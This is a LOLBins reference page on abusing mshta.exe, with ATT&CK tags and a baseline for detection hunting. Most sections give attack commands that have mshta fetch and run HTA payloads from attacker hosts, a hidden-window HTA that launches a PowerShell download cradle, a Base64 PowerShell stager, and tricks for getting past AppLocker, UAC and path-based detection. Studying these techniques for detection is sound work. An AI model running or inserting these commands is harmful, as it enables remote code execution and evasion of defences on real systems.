# LOLBins — mshta.exe — Hands-On Use Cases

Every scenario below relies on the HTA-loading and script-execution mechanics documented in `01 - Overview.md` — no child process, all code execution inside `mshta.exe`'s own address space. What changes per scenario is whether the HTA is remote or local, whether it's visible to the user, and how the technique chains with an intrusion. MITRE ATT&CK ID(s) are tagged per scenario.

## Contents
- [Remote HTA Download via HTTP/HTTPS](#remote-hta-download-via-httphttps)
- [Local HTA File Execution](#local-hta-file-execution)
- [UNC Path HTA Execution](#unc-path-hta-execution)
- [Chained Download-and-Execute One-Liner](#chained-download-and-execute-one-liner)
- [Hidden Window Execution](#hidden-window-execution)
- [HTA Staged from a C2 Framework](#hta-staged-from-a-c2-framework)
- [Bypassing AppLocker via Microsoft-Signed Binary](#bypassing-applock-via-microsoft-signed-binary)
- [Renamed Binary to Evade Path-Based Detection](#renamed-binary-to-evade-path-based-detection)
- [UAC Bypass via HTA (Windows 7 / Vista)](#uac-bypass-via-hta-windows-7--vista)
- [Embedded PowerShell Stager](#embedded-powershell-stager)
- [Empire HTA Launcher](#empire-hta-launcher)
- [Legitimate-Baseline Contrast](#legitimate-baseline-contrast)

---

## Remote HTA Download via HTTP/HTTPS

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer), [T1059.005](https://attack.mitre.org/techniques/T1059/005/) (Command and Scripting Interpreter: VBScript/JScript)

```cmd
mshta.exe http://198.51.100.7/payload.hta
```

The canonical mshta abuse one-liner. `mshta.exe` downloads the HTA file from the attacker's HTTP server, parses it, and executes the embedded JScript/VBScript inside the HTA's `<script>` tags. No child process is spawned; all code runs inside mshta's own process.

## Local HTA File Execution

**MITRE ATT&CK:** T1059.005

```cmd
mshta.exe C:\Users\Public\payload.hta
```

Executes a pre-staged HTA file from disk. The HTA file is parsed and executed in-process. Useful where the payload was already dropped onto the target via a prior delivery mechanism.

## UNC Path HTA Execution

**MITRE ATT&CK:** T1105, [T1570](https://attack.mitre.org/techniques/T1570/) (Lateral Tool Transfer)

```cmd
mshta.exe \\198.51.100.12\attacker_share\payload.hta
```

Loads the HTA from an attacker-controlled SMB share. No outbound Internet required — the attacker controls the SMB server, the HTA is fetched and executed.

## Chained Download-and-Execute One-Liner

**MITRE ATT&CK:** T1105, T1059.005

```powershell
# PowerShell variant
powershell -Command "mshta http://198.51.100.7/beacon.hta"

# cmd.exe variant
cmd.exe /c "mshta http://198.51.100.7/beacon.hta"
```

The mshta command embedded in a parent shell, common when the initial foothold is via a macro or script-injection that can only run shell commands.

## Hidden Window Execution

**MITRE ATT&CK:** T1027 (Obfuscated Files or Information)

```html
<!-- Hidden HTA execution (saved as payload.hta) -->
<html>
<head>
<hta:application id="hta" 
  applicationName="App" 
  version="1.0" 
  scroll="no" 
  singleInstance="yes" 
  windowState="hidden" />
</head>
<script language="vbscript">
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(...)"
  window.close()
</script>
</html>
```

Then invoke via `mshta http://attacker.com/payload.hta`. The HTA application properties (`windowState="hidden"`) suppress the UI window entirely, making the execution invisible to the user. The script runs, downloads a stager, executes it, and closes the window — leaving zero visible evidence.

## HTA Staged from a C2 Framework

**MITRE ATT&CK:** T1105, T1059.005

Typical real-world chain: an initial macro or phishing script gets code execution, then:

```cmd
mshta http://c2.attacker.com/stage2
```

where the C2-hosted HTA contains a stager that downloads and runs the full C2 agent. The HTA is the delivery vehicle; once the agent runs, the target's evidence trail gains a second layer specific to that C2 framework.

## Bypassing AppLocker via Microsoft-Signed Binary

**MITRE ATT&CK:** [T1218.005](https://attack.mitre.org/techniques/T1218/005/) (System Binary Proxy Execution: Mshta)

```cmd
mshta.exe http://198.51.100.7/payload.hta
```

`mshta.exe` is Microsoft-signed and shipped with the OS — nearly all application-control policies allowlist it by default. An attacker can use mshta to invoke malicious HTA code without triggering `cmd.exe` or `powershell.exe` blocks.

## Renamed Binary to Evade Path-Based Detection

**MITRE ATT&CK:** [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities)

```cmd
copy C:\Windows\System32\mshta.exe C:\Users\Public\explorer_update.exe
C:\Users\Public\explorer_update.exe http://198.51.100.7/payload.hta
```

Copies mshta under a different name, defeating detection rules keyed on `Image` = `C:\Windows\System32\mshta.exe`. Authenticode/file-hash checks still identify it as Microsoft-signed mshta.

## UAC Bypass via HTA (Windows 7 / Vista)

**MITRE ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002/) (Abuse Elevation Control Mechanism: Bypass User Account Control)

On Windows Vista and Windows 7 (now obsolete, but relevant for legacy systems), mshta could bypass UAC prompts in certain contexts. This technique is largely mitigated in Windows 8+, but the principle remains: a `mshta` invocation might execute with elevated privileges in specific configurations without explicit UAC prompt.

```cmd
mshta http://attacker.com/elevated_payload.hta
```

Where the HTA contains code that attempts to execute with SYSTEM or Administrator privileges by leveraging the UAC bypass surface. Modern Windows versions have closed most of these gaps.

## Embedded PowerShell Stager

**MITRE ATT&CK:** T1059.005, [T1140](https://attack.mitre.org/techniques/T1140/) (Deobfuscate/Decode Files or Information)

A common pattern: the HTA embeds a Base64-obfuscated PowerShell command:

```html
<html>
<script language="vbscript">
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAAg..."
</script>
</html>
```

saved as `payload.hta`, run via `mshta http://attacker.com/payload.hta`. The PowerShell command is obfuscated (Base64) and decoded/executed by PowerShell's own `-encodedcommand` flag, adding a layer of obfuscation.

## Empire HTA Launcher

**MITRE ATT&CK:** T1105, T1059.005

PowerShell Empire includes an `mshta` launcher that auto-generates an HTA payload. An operator using this launcher gets:

```cmd
mshta http://192.168.1.50:8080/launcher.hta
```

where `launcher.hta` is an auto-generated Empire HTA that fetches and decodes the Empire agent (typically Base64-obfuscated PowerShell), then executes it entirely in-memory.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor:

```cmd
mshta.exe "C:\Program Files\LegacyApp\dashboard.hta"
```

An IT administrator running a legacy HTML Application (now rare) generates `mshta.exe` process-creation events, but targeting a known application path from an internal repository, never an HTTP URL or remote server. This is the baseline a `/http://attacker.com/` hunt has to distinguish itself from.
